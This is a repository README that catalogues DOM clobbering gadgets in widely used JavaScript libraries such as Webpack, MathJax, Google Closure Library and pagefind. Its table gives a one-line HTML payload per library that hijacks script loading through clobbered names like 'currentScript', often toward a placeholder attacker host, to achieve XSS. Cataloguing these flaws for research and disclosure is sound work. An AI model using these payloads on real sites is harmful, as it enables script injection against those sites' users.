# DOM Clobbering Collection

In this repo, we collect a list of client-side libraries (>1K stars on Github or maintained by large companies) that contains DOM Clobbering gadgets that lead to severe consequences, e.g., XSS.

## DOM Clobbering Gadgets

| Library | Stars | Version | Payloads | Impact | Found By | CVE |
|:-------:|:-----:|:-------:|----------|:------:|:--------:|:---:|
| [AddToAny](https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/addtoany.md) | N/A |N/A | ```<img src="https://addtoany.xxx.xxx" name="currentScript">``` | XSS | TheHulk | N/A |
| [doomcaptcha](https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/doomcaptcha.md) | 1K |N/A | ```<img name=currentScript label="<script>alert(1)</script>"></img>``` | XSS | TheHulk | N/A |
| [Google Client API](https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/google-client-api.md) | N/A |5BIk7BglYEE | ```<iframe name="scripts" src=”https://apis.google.com/js/api.js”>alert("GG!")</iframe><iframe name="scripts" src=”https://apis.google.com/js/api.js”>alert("GG!")</iframe>``` | XSS | TheHulk | N/A |
| [Google Closure Library](https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/google-closure-library.md) | 4.9K |v20230103 | ```<img name="currentScript" src="https://xxx.xxx.xxx/base.js"></img>``` | XSS | TheHulk | N/A |
| [MathJax](https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/mathjax.md) | 10.1K |2.7.x | ```<a id="MathJax"></a> <a id="MathJax" name="root" href="https://xxx.xxx.xxx"></a>``` | XSS | TheHulk | N/A |
| [MathJax](https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/mathjax3.md) | 10.1K |3.2.2 | ```<img name="currentScript" src="https://xxx.xxxx.xxx"></img> $$\require{tex}$$``` | XSS | TheHulk | N/A |
| [pagefind](https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/pagefind.md) | 3.3K |v1.1.0 | ```<img name="currentScript" src="blob:https://xxx.xxx.xxx/ui.js"></img>``` | XSS | TheHulk | N/A |
| [steal](https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/steal.md) | 1.4K |2.3.0 | ```<img name="currentScript" src="https://xxx.xxx.xxx">``` | XSS | TheHulk | N/A |
| [Webpack](https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/webpack.md) | 64.4K |5.x.x | ```<img name="currentScript" src="https://xxx.xxxx.xxx"></img>``` | XSS | TheHulk | CVE-2024-43788 |
